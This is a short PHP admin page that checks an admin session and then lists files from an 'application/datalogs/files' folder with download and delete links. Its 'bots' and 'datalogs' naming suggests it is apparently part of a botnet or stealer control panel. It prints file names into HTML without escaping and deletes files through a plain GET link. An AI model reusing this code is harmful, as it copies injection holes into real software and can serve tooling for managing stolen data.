<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user']))){
	session_destroy();
	header("Location: /login.php");
}else{
	
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}
	
	if ($_SESSION['panel_right']!="admin"){
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>

<div class="content" style="padding-top:15px;">
 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
		<th><a style='color: #EDB749;'>File Name</a></th>
		<th><a title="Files"><img src="images/icons/table/icloud.png" width='25px'/></a></th>
	</thead>
	
<?php

$svoy=getcwd();
$godir="/application/datalogs/files";

$dir = "$svoy$godir";
$files2 = scandir($dir, 1);
echo "<p id='text_command' style='margin-top:5px; Color:#EDB749;  font-size: 13pt;'>Files</p>";
foreach($files2 as $fil)
{
	if ((!preg_match("/.htaccess/",$fil))&&(!preg_match("/fhkjadgjghkshkliy-.txt/",$fil))&&($fil!=".")&&($fil!=".."))
	{
		$nameF = $fil;
		$path = "application/datalogs/files/";
		
		
		echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><a title='$nameF'>$nameF</a></td>
				<td><a href='$path$fil' download>Download</a> / <a href='application/set/deleteFile.php?t=files&f=$nameF'>Delete</a></td>
				</tr>";
	}
}
?>
</div>
<?php
}
?>
